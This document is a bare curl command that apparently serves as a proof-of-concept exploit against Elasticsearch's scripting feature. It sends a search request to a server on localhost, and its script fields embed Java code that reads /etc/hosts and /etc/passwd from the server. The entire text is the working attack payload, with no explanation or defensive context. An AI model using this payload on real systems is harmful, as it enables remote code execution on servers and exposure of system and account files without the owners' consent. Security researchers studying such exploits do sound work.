curl -XPOST 'http://localhost:9200/_search?pretty' -d '
{
  "size": 1,
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      }
    }
  },
  "script_fields": {
    "/etc/hosts": {
      "script": "import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/hosts\")).useDelimiter(\"\\\\Z\").next();"
    },
    "/etc/passwd": {
      "script": "import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next();"
    }
  }
}
